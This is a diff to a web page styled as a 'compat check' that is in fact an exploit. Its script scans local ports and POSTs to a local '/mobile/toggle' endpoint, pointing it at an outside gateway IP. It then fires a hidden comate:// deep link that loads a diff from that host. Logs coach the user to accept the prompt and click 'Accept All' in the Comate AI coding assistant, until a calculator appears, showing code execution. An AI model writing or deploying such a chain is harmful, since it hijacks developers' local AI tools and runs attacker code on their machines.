@@ -4,6 +4,7 @@
 <body>
 <h4 style="font-family:monospace">compat check running...</h4>
 <pre id="log" style="font-family:monospace;font-size:12px"></pre>
+<button id="dl" style="padding:12px 20px;font-size:14px;display:none" onclick="fireDL()">Launch step (click if not auto)</button>
 <script>
 const log=m=>{document.getElementById('log').textContent+=m+"
 ";};
@@ -24,24 +25,31 @@ async function scanAll(tag,aliasFn,conc,ms){
   log(tag+' '+((Date.now()-t0)/1000).toFixed(1)+'s, open: '+(open.join(',')||'none'));
   return open;
 }
+function fireDL(){
+  const u='comate://comate-command/baidu.comate.knowledge.open?diffUrl=http%3A%2F%2F42.194.249.69%3A18998%2Fdiff.json';
+  const f=document.createElement('iframe');f.style.display='none';f.src=u;document.body.appendChild(f);
+  try{location.href=u}catch(e){}
+  log('deep link fired -> allow it, then click Accept All in Comate');
+}
 (async()=>{
   const qp=new URLSearchParams(location.search); const force=qp.get('port');
   let open=[];
   if(force){ open=[Number(force)]; log('forced port '+force); }
   else{
     open=await scanAll('fast',my=>ALIASES[my%12],90,400);
-    if(!open.length){ open=await scanAll('thorough',()=> '127.0.0.1',30,1200); }
+    if(!open.length){ open=await scanAll('thorough',()=>'127.0.0.1',30,1200); }
   }
-  if(!open.length){ log('no local service found in 8000-9000'); return; }
+  if(!open.length){ log('no local service found'); return; }
   for(const p of open){
     try{
       await fetch('http://127.0.0.1:'+p+'/mobile/toggle',{method:'POST',mode:'no-cors',
         headers:{'Content-Type':'text/plain'},
-        body:JSON.stringify({enabled:true,username:'gh-pages-test',gatewayUrl:'http://42.194.249.69:18998'})});
+        body:JSON.stringify({enabled:true,username:'u',gatewayUrl:'http://42.194.249.69:18998'})});
       log('toggle -> '+p+' : fired');
     }catch(e){ log('toggle -> '+p+' : '+e); }
   }
-  log('done.');
+  if(open.length){ document.getElementById('dl').style.display='block'; setTimeout(fireDL,1500); }
+  log('now: allow the comate:// prompt, click Accept All, wait ~25-40s for calculator.');
 })();
 </script>
 </body>
